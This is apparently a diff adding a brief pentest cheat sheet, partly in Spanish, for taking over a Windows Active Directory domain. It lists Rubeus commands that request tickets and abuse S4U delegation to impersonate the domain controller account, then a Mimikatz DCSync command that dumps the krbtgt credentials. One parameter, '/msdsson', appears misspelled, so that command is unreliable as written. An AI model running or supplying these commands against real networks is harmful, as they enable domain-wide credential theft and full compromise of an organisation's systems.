@@ -1,0 +1,11 @@
+.\Rubeus.exe tgtdeleg
+
+.\Rubeus.exe asktgt /user:<user> /password:<pass> /domain:<domain> /outfile:ticket.kirbi
+
+.\Rubeus.exe s4u /ticket:ticket.kirbi /msdsson:cifs/dc.<domain> /impersonate:DC$ /domain:<domain> /altservice:CIFS,HOST,LDAP /ppt
+
+Luego en el Klist tendría que salir el ticket del DC.
+
+Mimikatz
+
+lsadump::dcsync /user:<domain>\krbtgt /all /csv 
